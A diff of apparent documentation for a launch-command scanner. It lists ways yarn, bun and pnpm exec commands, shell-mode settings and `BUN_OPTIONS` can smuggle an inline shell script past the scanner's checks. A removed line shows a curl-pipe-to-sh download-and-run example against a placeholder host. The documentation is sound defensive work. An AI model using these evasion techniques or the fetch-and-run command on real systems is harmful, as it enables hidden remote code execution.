@@ -170,19 +170,30 @@ A way around a limit that its entry does not describe is worth a
   command under the rule above with no quoting and no tab; Yarn's shell also reads a
   leading `1=x`, whose name starts with a digit, as an assignment. Its words, and
   the `yarn exec` ARGS, are then a local launch whose arguments are checked like any
-  others; anything else is an inline shell script: a gap. `bun exec` takes one
+  others; anything else is an inline shell script: a gap. The ARGS are checked as
+  written and again as Yarn 1.22 passes them on: it removes the first `--` and, before
+  it, its own options with their values and any other option with the next word
+  unless that word starts with `-`. So `yarn exec sh -- -c SCRIPT` and
+  `yarn exec node --foo server.js -- -e CODE`, which Yarn 1 runs as `sh -c SCRIPT`
+  and `node -e CODE`, are gaps. `bun exec` takes one
   script: an option among its words (Bun reads `--cwd` there) or a word after the
   script is a gap. `yarn exec` accepts Yarn 1's `-s`, `--silent` and `--verbose`
   before SCRIPT, which change only its output; any other option there is a gap. A
   `bun exec` or `yarn exec` in another command's arguments is a gap too, and so is
-  `pnpm -c`, `--shell-mode` or `--config.shell-mode` there, which make `pnpm exec`
-  run a shell command line. So `bun exec "curl -s https://example.test/x | sh"` is a
+  any pnpm option there that may turn on shell mode, which makes `pnpm exec` run a
+  shell command line: `-c`, any prefix of `--shell-mode` from `--sh` on, with any
+  number of leading dashes or `no-` prefixes, and `--config.<key>` whose key reads
+  as `shellMode` once `-`, `_`, `.` and case are ignored, also as the word after
+  `-C` or `--dir`, which pnpm leaves as an option. So
+  `bun exec "echo marker | cat"` is a
   gap, and `bun exec "node server.js"` and `yarn exec node server.js` are local
   launches. A package manager published under another package name is recognised
   only as `@yarnpkg/cli-dist` (Yarn 2 and later, run as `yarn`) and `@pnpm/exe`; a
   runner such as `npx` that starts any other package exposing `yarn`, `bun` or
   `pnpm` takes the package's own name as its program, so that program's `exec` is
-  not read.
+  not read. A command that is a runner's script entry point, such as npm's
+  `npx-cli.js`, `pnpm.cjs` or corepack's `dist/yarn.js`, is a gap: the runner grammars
+  are looked up by program name and would not read its words.
 - **`BUN_OPTIONS` is a gap.** Every bun a launch starts, behind any wrapper or
   runner, adds the words of `BUN_OPTIONS` to its own arguments, so
   `BUN_OPTIONS="exec 'SCRIPT'"` makes `bun server.ts` run SCRIPT in Bun Shell. A
@@ -254,8 +265,14 @@ A way around a limit that its entry does not describe is worth a
   (`working-directory=[unresolved]`) and a medium `package_source` risk.
   pnpm 10 reads `shellMode: true` from `pnpm-workspace.yaml` and then joins the
   words after `pnpm exec` into a shell command line. A root `pnpm-workspace.yaml`
-  is a `registry` gap, but one in a server's working directory below the root is
+  is a `registry` gap, but one in a server's working directory below the root, or in
+  a directory that a `pnpm -C` or `--dir` in another command's arguments names, is
   not seen, so such a `pnpm exec` stays a local launch whatever its words hold.
+  pnpm 9 and earlier also read `shell-mode` from `npm_config_shell_mode` and the
+  project `.npmrc`. That variable in a server's environment, in any spelling that
+  reads as `shellMode`, is a high `launcher_identity` finding and a gap whatever the
+  command, and so is a root `.npmrc` key that reads as `shellMode` for a server whose
+  command or arguments mention `pnpm`; an `.npmrc` below the root is not read.
 - **Injected environments are not visible.** Variables from an `envFile`, or from
   `dotenvx`, `doppler`, `infisical` or `op run --env-file`, are not read. A launched
   package then carries `environment-file=[unresolved]` instead of its identity.
